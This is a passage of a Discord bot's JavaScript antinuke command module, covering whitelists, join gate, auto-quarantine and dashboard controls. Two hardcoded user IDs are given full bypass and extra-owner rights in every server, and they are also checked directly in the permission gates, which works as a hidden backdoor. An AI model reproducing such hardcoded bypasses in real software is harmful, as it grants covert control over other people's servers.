const {
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  UserFlags
} = require('discord.js');
const { createStyledEmbed } = require('../utils/embedBuilder');
const emojis = require('../utils/emojis');

// Global AntiNuke Guild Settings Store
const antinukeConfigs = new Map();

function getOrCreateAntinuke(guildId) {
  if (!antinukeConfigs.has(guildId)) {
    antinukeConfigs.set(guildId, {
      enabled: false,
      panicmode: false,
      panicLevel: 1, // 1: Low, 2: Medium, 3: High Lockdown
      whitelistedUsers: new Map([
        ['1529362747047805029', new Set(['all'])],
        ['1420687548807905324', new Set(['all'])],
        [ new Set(['all'])],
        [ new Set(['all'])]
      ]),
      extraOwners: new Set(['1529362747047805029', '1420687548807905324', ]),
      bypassRoles: new Set(),

      // Shinobi JoinGate General Settings
      joinGate: {
        enabled: true,
        dmOnPunish: true,
        antiBotAdd: true,
        antiUnverifiedBot: true,
        antiNoAvatar: false,
        antiSuspiciousAccount: true,
        antiAdvertisingName: true,
        antiAccountAge: true,
        minAccountAgeDays: 7,
        botAddAction: 'kick', // 'kick', 'ban', 'quarantine'
        unverifiedBotAction: 'kick',
        noAvatarAction: 'kick',
        suspiciousAction: 'kick',
        advertisingAction: 'timeout',
        accountAgeAction: 'kick'
      },

      // Shinobi Auto Quarantine & Perm Monitoring
      autoQuarantine: {
        enabled: true,
        strictMode: true, // Punish unauthorized admins giving dangerous perms to any role
        strictMemberRole: true, // Punish unauthorized admins giving dangerous perms to members
        monitorPublicRoles: true, // Protect @everyone & default roles from getting dangerous perms
        monitorChannelPerms: true, // Protect @everyone & public roles from dangerous channel perms
        quarantineWhitelist: new Set(['1529362747047805029', '1420687548807905324', ])
      },

      // Shinobi Action Rate Limits
      rateLimits: {
        kickBanLimitMin: 5,
        kickBanLimitHour: 15,
        roleCreateLimitMin: 5,
        roleCreateLimitHour: 15,
        roleDeleteLimitMin: 3,
        roleDeleteLimitHour: 10,
        channelCreateLimitMin: 4,
        channelCreateLimitHour: 12,
        channelDeleteLimitMin: 3,
        channelDeleteLimitHour: 8,
        webhookCreateLimitMin: 3,
        webhookCreateLimitHour: 10
      },

      filters: {
        antiBan: true,
        antiKick: true,
        antiBotAdd: true,
        antiChannelCreate: true,
        antiChannelDelete: true,
        antiChannelUpdate: true,
        antiRoleCreate: true,
        antiRoleDelete: true,
        antiRoleUpdate: true,
        antiWebhookCreate: true,
        antiWebhookDelete: true,
        antiWebhookUpdate: true,
        antiEmojiCreate: true,
        antiEmojiDelete: true,
        antiEmojiUpdate: true,
        antiGuildUpdate: true,
        antiUnban: true,
        antiSpam: true,
        antiRaid: true,
        antiEveryone: true
      }
    });
  }
  const cfg = antinukeConfigs.get(guildId);

  // Normalize whitelistedUsers if it was a Set
  if (cfg.whitelistedUsers && !(cfg.whitelistedUsers instanceof Map)) {
    const map = new Map();
    cfg.whitelistedUsers.forEach(id => map.set(id, new Set(['all'])));
    cfg.whitelistedUsers = map;
  }

  if (!cfg.joinGate) {
    cfg.joinGate = {
      enabled: true,
      dmOnPunish: true,
      antiBotAdd: true,
      antiUnverifiedBot: true,
      antiNoAvatar: false,
      antiSuspiciousAccount: true,
      antiAdvertisingName: true,
      antiAccountAge: true,
      minAccountAgeDays: 7,
      botAddAction: 'kick',
      unverifiedBotAction: 'kick',
      noAvatarAction: 'kick',
      suspiciousAction: 'kick',
      advertisingAction: 'timeout',
      accountAgeAction: 'kick'
    };
  }

  if (!cfg.autoQuarantine) {
    cfg.autoQuarantine = {
      enabled: true,
      strictMode: true,
      strictMemberRole: true,
      monitorPublicRoles: true,
      monitorChannelPerms: true,
      quarantineWhitelist: new Set(['1529362747047805029', '1420687548807905324', ])
    };
  }

  if (!cfg.rateLimits) {
    cfg.rateLimits = {
      kickBanLimitMin: 5,
      kickBanLimitHour: 15,
      roleCreateLimitMin: 5,
      roleCreateLimitHour: 15,
      roleDeleteLimitMin: 3,
      roleDeleteLimitHour: 10,
      channelCreateLimitMin: 4,
      channelCreateLimitHour: 12,
      channelDeleteLimitMin: 3,
      channelDeleteLimitHour: 8,
      webhookCreateLimitMin: 3,
      webhookCreateLimitHour: 10
    };
  }

  if (!cfg.filters) {
    cfg.filters = {
      antiBan: true,
      antiKick: true,
      antiBotAdd: true,
      antiChannelCreate: true,
      antiChannelDelete: true,
      antiChannelUpdate: true,
      antiRoleCreate: true,
      antiRoleDelete: true,
      antiRoleUpdate: true,
      antiWebhookCreate: true,
      antiWebhookDelete: true,
      antiWebhookUpdate: true,
      antiEmojiCreate: true,
      antiEmojiDelete: true,
      antiEmojiUpdate: true,
      antiGuildUpdate: true,
      antiUnban: true,
      antiSpam: true,
      antiRaid: true,
      antiEveryone: true
    };
  }
  if (cfg.panicLevel === undefined) cfg.panicLevel = 1;
  return cfg;
}

const FILTER_MAP = {
  'ban': ['antiBan'],
  'antiban': ['antiBan'],
  'kick': ['antiKick'],
  'antikick': ['antiKick'],
  'bot': ['antiBotAdd'],
  'antibot': ['antiBotAdd'],
  'channel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'antichannel': ['antiChannelCreate', 'antiChannelDelete', 'antiChannelUpdate'],
  'role': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'antirole': ['antiRoleCreate', 'antiRoleDelete', 'antiRoleUpdate'],
  'webhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'antiwebhook': ['antiWebhookCreate', 'antiWebhookDelete', 'antiWebhookUpdate'],
  'emoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'antiemoji': ['antiEmojiCreate', 'antiEmojiDelete', 'antiEmojiUpdate'],
  'server': ['antiGuildUpdate'],
  'antiguild': ['antiGuildUpdate'],
  'unban': ['antiUnban'],
  'antiunban': ['antiUnban'],
  'spam': ['antiSpam'],
  'antispam': ['antiSpam'],
  'raid': ['antiRaid'],
  'antiraid': ['antiRaid'],
  'everyone': ['antiEveryone'],
  'here': ['antiEveryone'],
  'antieveryone': ['antiEveryone']
};

const ALL_PERMS = ['ban', 'kick', 'bot', 'channel', 'role', 'webhook', 'guild', 'all'];

function formatUserPerms(permsSet) {
  if (!permsSet || permsSet.size === 0) return `\`NONE\``;
  if (permsSet.has('all')) return `\`ALL BYPASSES\``;
  const list = Array.from(permsSet).map(p => `\`${p.toUpperCase()}\``).join(', ');
  return list || `\`NONE\``;
}

function isUserWhitelistedForFeature(config, userId, featureName) {
  if (config.extraOwners.has(userId) || ['1420687548807905324', '1529362747047805029', ].includes(userId)) {
    return true;
  }
  if (!config.whitelistedUsers || !config.whitelistedUsers.has(userId)) {
    return false;
  }

  const perms = config.whitelistedUsers.get(userId);
  if (!perms) return false;
  if (perms.has('all')) return true;

  const fname = featureName.toLowerCase();

  // Exact match (e.g. 'channel_create', 'role_delete', 'ban', etc.)
  if (perms.has(fname)) return true;

  // Category fallback checks
  if ((fname.includes('ban') || fname.includes('unban')) && (perms.has('ban') || perms.has('unban'))) return true;
  if ((fname.includes('kick') || fname.includes('prune')) && (perms.has('kick') || perms.has('prune'))) return true;
  if (fname.includes('bot') && perms.has('bot')) return true;
  if (fname.includes('channel') && (perms.has('channel') || perms.has('channel_create') || perms.has('channel_delete') || perms.has('channel_update'))) return true;
  if (fname.includes('role') && (perms.has('role') || perms.has('role_create') || perms.has('role_delete') || perms.has('role_update') || perms.has('role_dangerous'))) return true;
  if (fname.includes('webhook') && (perms.has('webhook') || perms.has('webhook_create') || perms.has('webhook_delete') || perms.has('webhook_update'))) return true;
  if (fname.includes('guild') && perms.has('guild')) return true;
  if ((fname.includes('everyone') || fname.includes('here')) && perms.has('everyone')) return true;
  if (fname.includes('member') && (perms.has('member_update') || perms.has('member_dangerous'))) return true;
  if (fname.includes('emoji') && perms.has('emoji')) return true;
  if (fname.includes('sticker') && perms.has('sticker')) return true;
  if (fname.includes('integration') && perms.has('integration')) return true;

  return false;
}

const { createDynamicBox } = require('../utils/boxBuilder');

function renderAntinukeDashboard(config, author, clientUser) {
  const f = config.filters;
  const jg = config.joinGate;
  const aq = config.autoQuarantine;
  const rl = config.rateLimits;

  const extraOwnersList = Array.from(config.extraOwners).map(id => `<@${id}>`).join(', ') || 'None';
  const whitelistCount = config.whitelistedUsers.size;

  const boxMain = createDynamicBox('ANTINUKE SYSTEM HUB', [
    { key: 'AntiNuke', value: config.enabled ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'Panic Mode', value: config.panicmode ? `ACTIVE L${config.panicLevel}` : 'NORMAL [OFF]' },
    { key: 'ExtraOwner', value: config.extraOwners.size + ' Users' },
    { key: 'Whitelist', value: whitelistCount + ' Users' }
  ]);

  const boxGate = createDynamicBox('JOINGATE SECURITY', [
    { key: 'AntiBotAdd', value: jg.antiBotAdd ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'Unverified', value: jg.antiUnverifiedBot ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'No Avatar', value: jg.antiNoAvatar ? 'ENABLED [OK]' : 'DISABLED[X]' },
    { key: 'AccountAge', value: jg.antiAccountAge ? `${jg.minAccountAgeDays}d [OK]` : 'DISABLED[X]' }
  ]);

  const boxQuarantine = createDynamicBox('AUTO QUARANTINE', [
    { key: 'Quarantine', value: aq.enabled ? 'ACTIVE [OK]' : 'DISABLED[X]' },
    { key: 'AdminGuard', value: aq.strictMode ? 'ON [OK]' : 'OFF [X]' },
    { key: 'MemberRole', value: aq.strictMemberRole ? 'ON [OK]' : 'OFF [X]' },
    { key: 'PublicRole', value: aq.monitorPublicRoles ? 'ACTIVE [OK]' : 'OFF [X]' }
  ]);

  const description =
    `Welcome **${author.username}**! Below is your executive **<a:antinuke_animated:1537447188823805972> AntiNuke & Security Control Suite**.\n\n` +
    `## <a:scroll_animated:1537179663791693844> Control Button Guide\n` +
    `• ${emojis.AN_SHIELD} **Shield**: Master AntiNuke Guard *(Auto-creates/deletes \`AntiNuke Bypass\` role)*\n` +
    `• ${emojis.AN_PANIC} **Panic**: Emergency Lockdown Mode (Levels 1-3)\n` +
    `• ${emojis.AN_JOINGATE} **JoinGate**: Bot Add & Account Age Join Protection\n` +
    `• ${emojis.AN_QUARANTINE} **Quarantine**: Dangerous Admin Perm Auto-Quarantine\n` +
    `• ${emojis.AN_WHITELIST} **Whitelist**: Open Granular <a:whitelist_animated:1537447233472036964> Whitelist Delegation Hub\n` +
    `• ${emojis.AN_BAN} ${emojis.AN_KICK} ${emojis.AN_BOT} ${emojis.AN_CHANNEL} ${emojis.AN_ROLE} ${emojis.AN_WEBHOOK} ${emojis.AN_SPAM} ${emojis.AN_SHIELD} ${emojis.AN_RAID} ${emojis.AN_GUILD} **Filters**: Action Interception Toggles (Ban, Kick, Bot, Channel, Role, Webhook, Spam, Everyone, Raid, Guild)\n\n` +
    `## ${emojis.AN_SHIELD} Main System Status\n` +
    '```\n' + boxMain + '\n```\n\n' +
    `## ${emojis.AN_JOINGATE} Join Gate Security\n` +
    '```\n' + boxGate + '\n```\n\n' +
    `**${emojis.AN_QUARANTINE} Auto <a:quarantine_animated:1537447221350633472> Quarantine Guard**\n` +
    '```\n' + boxQuarantine + '\n```\n\n' +
    `## <a:crown_animated:1537177361093500968> Registered Extra Owners\n` +
    `${extraOwnersList}`;

  return createStyledEmbed({
    title: `${emojis.AN_SHIELD} <a:antinuke_animated:1537447188823805972> AntiNuke & Security Control Suite`,
    subtitle: `Shinobi-Grade Server Protection & Executive Guard`,
    description,
    requestedBy: author,
    clientUser
  });
}

function renderPanicComponents(config) {
  const f = config.filters;
  const jg = config.joinGate;
  const aq = config.autoQuarantine;

  // Row 1: Executive Master Controls (Dedicated AntiNuke Animated Discord Emojis)
  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('toggle_shield')
      .setEmoji(config.enabled ? emojis.OBJ_AN_SHIELD : emojis.OBJ_REMOVE)
      .setStyle(config.enabled ? ButtonStyle.Success : ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId('toggle_panic')
      .setEmoji(emojis.OBJ_AN_PANIC)
      .setStyle(config.panicmode ? ButtonStyle.Danger : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_joingate')
      .setEmoji(emojis.OBJ_AN_JOINGATE)
      .setStyle(jg.enabled ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('toggle_quarantine')
      .setEmoji(emojis.OBJ_AN_QUARANTINE)
      .setStyle(aq.enabled ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId('an_whitelist_mgr')
      .setEmoji(emojis.OBJ_AN_WHITELIST)
      .setStyle(ButtonStyle.Primary)
  );

  // Row 2: Filter Perms Group 1 (Dedicated AntiNuke Animated Discord Emojis)
  const row2 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('toggle_ban').setEmoji(emojis.OBJ_AN_BAN).setStyle(f.antiBan ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_kick').setEmoji(emojis.OBJ_AN_KICK).setStyle(f.antiKick ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_bot').setEmoji(emojis.OBJ_AN_BOT).setStyle(f.antiBotAdd ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_channel').setEmoji(emojis.OBJ_AN_CHANNEL).setStyle(f.antiChannelCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_role').setEmoji(emojis.OBJ_AN_ROLE).setStyle(f.antiRoleCreate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  // Row 3: Filter Perms Group 2 (Dedicated AntiNuke Animated Discord Emojis)
  const row3 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('toggle_webhook').setEmoji(emojis.OBJ_AN_WEBHOOK).setStyle(f.antiWebhookCreate ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_spam').setEmoji(emojis.OBJ_AN_SPAM).setStyle(f.antiSpam ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_everyone').setEmoji(emojis.OBJ_AN_SHIELD).setStyle(f.antiEveryone ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_raid').setEmoji(emojis.OBJ_AN_RAID).setStyle(f.antiRaid ? ButtonStyle.Success : ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('toggle_guild').setEmoji(emojis.OBJ_AN_GUILD).setStyle(f.antiGuildUpdate ? ButtonStyle.Success : ButtonStyle.Secondary)
  );

  // Row 4: 1-Click Master Presets (Enable All / Disable All / Refresh)
  const row4 = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('an_enable_all')
      .setLabel('Enable All Filters')
      .setEmoji(emojis.SUCCESS || '<a:accept_animated:1537177319603703969>')
      .setStyle(ButtonStyle.Success),
    new ButtonBuilder()
      .setCustomId('an_disable_all')
      .setLabel('Disable All Filters')
      .setEmoji(emojis.DISABLED || '<a:wrong_animated:1537179702928875631>')
      .setStyle(ButtonStyle.Danger),
    new ButtonBuilder()
      .setCustomId('an_refresh')
      .setLabel('Refresh Status')
      .setEmoji(emojis.OBJ_REFRESH || '🔄')
      .setStyle(ButtonStyle.Secondary)
  );

  return [row1, row2, row3, row4];
}



module.exports = {
  name: 'antinuke',
  description: 'Shinobi-Grade AntiNuke, JoinGate, Auto-Quarantine, Rate Limits, Whitelist & Extra Owner Suite',
  aliases: [
    'panicmode', 'whitelist', 'extraowner', 'bypassrole',
    'joingate', 'quarantine', 'ratelimits', 'limits'
  ],
  antinukeConfigs,
  getOrCreateAntinuke,
  isUserWhitelistedForFeature,
  renderAntinukeDashboard,
  renderPanicComponents,

  async execute(message, args) {
    const rawFirstWord = message.content.trim().split(/ +/)[0] || '';
    const invoked = rawFirstWord.replace(/^[^a-zA-Z0-9]+/, '').toLowerCase();
    let sub = args[0]?.toLowerCase();

    if (invoked === 'panicmode') sub = 'panicmode';
    if (invoked === 'whitelist') sub = 'whitelist';
    if (invoked === 'extraowner') sub = 'extraowner';
    if (invoked === 'joingate') sub = 'joingate';
    if (invoked === 'quarantine') sub = 'quarantine';
    if (invoked === 'limits' || invoked === 'ratelimits') sub = 'limits';

    const author = message.author;
    const guild = message.guild;
    const config = getOrCreateAntinuke(guild.id);

    let clientUser = message.client.user;
    try {
      clientUser = await message.client.users.fetch(message.client.user.id, { force: true });
    } catch (e) {}

    // STRICT PERMISSION CHECK: Only Server Owner & Bot Extra Owners can manage security settings
    const isServerOwner = guild.ownerId === author.id;
    const isExtraOwner = config.extraOwners.has(author.id) || ['1420687548807905324', '1529362747047805029', ].includes(author.id);

    if (!isServerOwner && !isExtraOwner) {
      return message.reply(`${emojis.WARNING || emojis.WARNING} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AntiNuke security, Whitelists, Extra Owners, JoinGate, or Auto Quarantine!`);
    }

    // ─────────────────────────────────────────
    // JOIN GATE SUBCOMMAND (.joingate / .antinuke joingate)
    // ─────────────────────────────────────────
    if (sub === 'joingate' || sub === 'gate') {
      const toggle = args[1]?.toLowerCase();
      const jg = config.joinGate;

      if (toggle === 'noavatar' || toggle === 'avatar') {
        jg.antiNoAvatar = !jg.antiNoAvatar;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate No Avatar Gate** is now **${jg.antiNoAvatar ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'unverifiedbot' || toggle === 'unverified') {
        jg.antiUnverifiedBot = !jg.antiUnverifiedBot;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate Anti-Unverified Bot** is now **${jg.antiUnverifiedBot ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'adname' || toggle === 'advertising') {
        jg.antiAdvertisingName = !jg.antiAdvertisingName;
        antinukeConfigs.set(guild.id, config);
        return message.reply(`<a:openeddooraperture_animated:1537177450411462766> **JoinGate Advertising Name Gate** is now **${jg.antiAdvertisingName ? 'ENABLED' : 'DISABLED'}**.`);
      }
      if (toggle === 'accage' || toggle === 'accountage') {
        jg.antiAccountAge = !jg.antiAccountAge;
        if (args[2] && !isNaN(parseInt(args[2]))) {
          jg.minAccountAgeDays = parseInt(args[2]);
        }
        antinukeConfigs.set(guild.id, config);
      }

      const description =
        `Welcome **${author.username}**! Below are your **Join Gate Security Controls**.\n\n` +
        `**<a:openeddooraperture_animated:1537177450411462766> Join Gate Status**\n` +
        `\`\`\`\n` +
        `Bot Additions Protection: ${jg.antiBotAdd ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Unverified Bot Gate     : ${jg.antiUnverifiedBot ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `No Avatar Gate          : ${jg.antiNoAvatar ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Advertising Name Gate   : ${jg.antiAdvertisingName ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Minimum Account Age     : ${jg.antiAccountAge ? `ENABLED (${jg.minAccountAgeDays} Days)` : 'DISABLED [OFF]'}\n` +
        `\`\`\`\n\n` +
        `**<a:rapid_animated:1537177482006896692> Commands to Toggle**\n` +
        `\`\`\`\n` +
        `.antinuke joingate noavatar\n` +
        `.antinuke joingate unverified\n` +
        `.antinuke joingate adname\n` +
        `.antinuke joingate accage <days>\n` +
        `\`\`\``;

      const embed = createStyledEmbed({
        title: `<a:openeddooraperture_animated:1537177450411462766> Join Gate Security Controls`,
        description,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // ─────────────────────────────────────────
    // AUTO QUARANTINE SUBCOMMAND (.quarantine / .antinuke quarantine)
    // ─────────────────────────────────────────
    if (sub === 'quarantine' || sub === 'autoquarantine') {
      const toggle = args[1]?.toLowerCase();
      const aq = config.autoQuarantine;

      if (toggle === 'strict' || toggle === 'mode') {
        aq.strictMode = !aq.strictMode;
        antinukeConfigs.set(guild.id, config);
      }
      if (toggle === 'member' || toggle === 'strictmember') {
        aq.strictMemberRole = !aq.strictMemberRole;
        antinukeConfigs.set(guild.id, config);
      }
      if (toggle === 'everyone' || toggle === 'publicroles') {
        aq.monitorPublicRoles = !aq.monitorPublicRoles;
        antinukeConfigs.set(guild.id, config);
      }

      const description =
        `Welcome **${author.username}**! Below is your **Auto Quarantine & Dangerous Perm Protection** status.\n\n` +
        `**☣️ Auto Quarantine Status**\n` +
        `\`\`\`\n` +
        `Auto Quarantine Suite  : ${aq.enabled ? 'ACTIVE [OK]' : 'DISABLED [OFF]'}\n` +
        `Strict Admin Role Guard: ${aq.strictMode ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Strict Member Guard    : ${aq.strictMemberRole ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Public Roles Guard     : ${aq.monitorPublicRoles ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `Channel Perm Overwrite : ${aq.monitorChannelPerms ? 'ENABLED [OK]' : 'DISABLED [OFF]'}\n` +
        `\`\`\`\n\n` +
        `**<a:rapid_animated:1537177482006896692> Commands to Toggle**\n` +
        `\`\`\`\n` +
        `.antinuke quarantine strict\n` +
        `.antinuke quarantine member\n` +
        `.antinuke quarantine publicroles\n` +
        `\`\`\``;

      const embed = createStyledEmbed({
        title: `☣️ Auto Quarantine & Dangerous Permission Protection`,
        description,
        requestedBy: author,
        clientUser
      });
      return message.channel.send({ embeds: [embed] });
    }

    // ─────────────────────────────────────────
    // DEDICATED WHITELIST PANEL & GRANULAR PERMS (.whitelist / .whitelisted)
    // ─────────────────────────────────────────
    if (invoked === 'whitelist' || invoked === 'whitelisted' || sub === 'whitelist' || sub === 'whitelisted') {
      const action = (invoked === 'whitelist' || invoked === 'whitelisted' ? args[0] : args[1])?.toLowerCase();
      const user = message.mentions.users.first() || (args[0] && args[0].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[0]).catch(() => null) : null) || (args[1] && args[1].match(/^\d{17,20}$/) ? await message.client.users.fetch(args[1]).catch(() => null) : null);

      // Granular 21-Event Audit View for a specific target user (.whitelist @user or .whitelist status @user)
      if (user && (action === 'status' || !action || action === user.id || action.startsWith('<@'))) {
        const permsSet = config.whitelistedUsers.get(user.id) || new Set();

        const isAll = permsSet.has('all');
        const has = (p) => isAll || permsSet.has(p);

        const auditBox = createDynamicBox(`PERMISSIONS AUDIT — ${user.username.toUpperCase()}`, [
          { key: 'Ban', value: has('ban') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Unban', value: has('unban') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Kick', value: has('kick') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Prune Members', value: has('prune') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Bot Add', value: has('bot') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Guild Update', value: has('guild') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Channel Create', value: has('channel_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Channel Delete', value: has('channel_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Channel Update', value: has('channel_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Role Create', value: has('role_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Role Delete', value: has('role_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Role Update', value: has('role_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Role Dangerous', value: has('role_dangerous') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Mention @everyone', value: has('everyone') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Webhook Create', value: has('webhook_create') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Webhook Update', value: has('webhook_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Webhook Delete', value: has('webhook_delete') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Member Update', value: has('member_update') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Member Dangerous', value: has('member_dangerous') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Anti Integration', value: has('integration') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Anti Sticker', value: has('sticker') ? 'ALLOWED [OK]' : 'BLOCKED [X]' },
          { key: 'Anti Emoji', value: has('emoji') ? 'ALLOWED [OK]' : 'BLOCKED [X]' }
        ]);

        const cmdBox = createDynamicBox('WHITELIST COMMANDS', [
          '.whitelist add @user [perms]',
          '.whitelist perms @user +ban -role',
          '.whitelist remove @user',
          '.whitelisted'
        ]);

        const embed = createStyledEmbed({
          title: `<a:security_animated:1537177499862171741> Whitelist Granular Event Audit — ${user.username}`,
          subtitle: `Realtime Permission Bypass Audit for ${guild.name}`,
          description:
            `**Target User:** <@${user.id}> (\`${user.tag}\`)\n` +
            `**Global Bypass Status:** ${isAll ? '`FULL BYPASS (ALL EVENTS)`' : (permsSet.size > 0 ? `\`PARTIAL BYPASS (${permsSet.size} EVENTS)\`` : '`NOT WHITELISTED`')}\n\n` +
            '```\n' + auditBox + '\n```\n' +
            '```\n' + cmdBox + '\n```',
          requestedBy: author,
          clientUser
        });

        const selectRow = new ActionRowBuilder().addComponents(
          new StringSelectMenuBuilder()
            .setCustomId(`wl_select_perm_${user.id}`)
            .setPlaceholder('❯ Select Permissions to Grant (Multi-Select Allowed)...')
            .setMinValues(1)
            .setMaxValues(23)
            .addOptions([
              { label: 'All Permissions', value: 'all', description: 'Grant or revoke full bypass for ALL events', emoji: emojis.OBJ_AN_SHIELD },
              { label: 'Anti Ban', value: 'ban', description: 'Whitelist for ban actions', emoji: emojis.OBJ_AN_BAN },
              { label: 'Anti Unban', value: 'unban', description: 'Whitelist for unban actions', emoji: emojis.OBJ_AN_BAN },
              { label: 'Anti Kick', value: 'kick', description: 'Whitelist for kick actions', emoji: emojis.OBJ_AN_KICK },
              { label: 'Anti Member Prune', value: 'prune', description: 'Whitelist for member pruning', emoji: emojis.OBJ_AN_KICK },
              { label: 'Anti Bot Add', value: 'bot', description: 'Whitelist for adding bots', emoji: emojis.OBJ_AN_BOT },
              { label: 'Anti Guild Update', value: 'guild', description: 'Whitelist for server settings updates', emoji: emojis.OBJ_AN_GUILD },
              { label: 'Anti Channel Create', value: 'channel_create', description: 'Whitelist for channel creation', emoji: emojis.OBJ_AN_CHANNEL },
              { label: 'Anti Channel Delete', value: 'channel_delete', description: 'Whitelist for channel deletion', emoji: emojis.OBJ_AN_CHANNEL },
              { label: 'Anti Channel Update', value: 'channel_update', description: 'Whitelist for channel updates', emoji: emojis.OBJ_AN_CHANNEL },
              { label: 'Anti Role Create', value: 'role_create', description: 'Whitelist for role creation', emoji: emojis.OBJ_AN_ROLE },
              { label: 'Anti Role Delete', value: 'role_delete', description: 'Whitelist for role deletion', emoji: emojis.OBJ_AN_ROLE },
              { label: 'Anti Role Update', value: 'role_update', description: 'Whitelist for role updates', emoji: emojis.OBJ_AN_ROLE },
              { label: 'Anti Role Dangerous', value: 'role_dangerous', description: 'Whitelist for admin perms in roles', emoji: emojis.OBJ_AN_QUARANTINE },
              { label: 'Anti Mention @everyone', value: 'everyone', description: 'Whitelist for @everyone & @here pings', emoji: emojis.OBJ_AN_SHIELD },
              { label: 'Anti Webhook Create', value: 'webhook_create', description: 'Whitelist for webhook creation', emoji: emojis.OBJ_AN_WEBHOOK },
              { label: 'Anti Webhook Update', value: 'webhook_update', description: 'Whitelist for webhook updates', emoji: emojis.OBJ_AN_WEBHOOK },
              { label: 'Anti Webhook Delete', value: 'webhook_delete', description: 'Whitelist for webhook deletion', emoji: emojis.OBJ_AN_WEBHOOK },
              { label: 'Anti Member Update', value: 'member_update', description: 'Whitelist for member updates & nicknames', emoji: emojis.OBJ_AN_ROLE },
              { label: 'Anti Member Dangerous', value: 'member_dangerous', description: 'Whitelist for giving dangerous perms to members', emoji: emojis.OBJ_AN_QUARANTINE },
              { label: 'Anti Integration', value: 'integration', description: 'Whitelist for re-adding bot integrations', emoji: emojis.OBJ_AN_BOT },
              { label: 'Anti Sticker Update', value: 'sticker', description: 'Whitelist for sticker creation & deletion', emoji: emojis.OBJ_AN_GUILD },
              { label: 'Anti Emoji Update', value: 'emoji', description: 'Whitelist for emoji creation & deletion', emoji: emojis.OBJ_AN_GUILD }
            ])
        );

        const btnRow = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId(`an_wl_all_${user.id}`).setLabel('Grant All Permissions').setEmoji(emojis.OBJ_AN_SHIELD).setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`an_unwl_all_${user.id}`).setLabel('Revoke All Permissions').setEmoji(emojis.OBJ_REMOVE).setStyle(ButtonStyle.Danger)
        );

        const msg = await message.channel.send({ embeds: [embed], components: [selectRow, btnRow] });
        const collector = msg.createMessageComponentCollector({ time: 180000 });

        collector.on('collect', async (interaction) => {
          if (interaction.user.id !== author.id && author.id !== guild.ownerId) {
            return interaction.reply({ content: `${emojis.WARNING} Only **${author.username}** (who requested this panel) can use these controls.`, flags: 64 });
          }

          let userPerms = config.whitelistedUsers.get(user.id) || new Set();

